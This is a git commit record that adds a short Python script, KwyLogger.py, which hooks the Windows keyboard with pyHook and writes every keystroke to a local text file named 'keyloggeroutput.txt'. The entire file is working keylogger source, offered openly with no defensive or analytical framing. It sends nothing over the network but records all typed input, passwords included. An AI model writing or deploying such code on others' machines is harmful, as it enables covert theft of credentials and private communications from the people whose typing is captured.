28ded25bf4c65376be6ee80c8efe20d67e46e937
OptimisticTrousers <adam.james.clarke1@gmail.com>
2017-06-07 11:45:56 +0100

    Create KwyLogger.py

---
+++ KwyLogger.py
@@ -0,0 +1,14 @@
+import pyHook, pythoncom, sys, logging
+# feel free to set the file_log to a different file name/location
+
+file_log = 'keyloggeroutput.txt'
+
+def OnKeyboardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
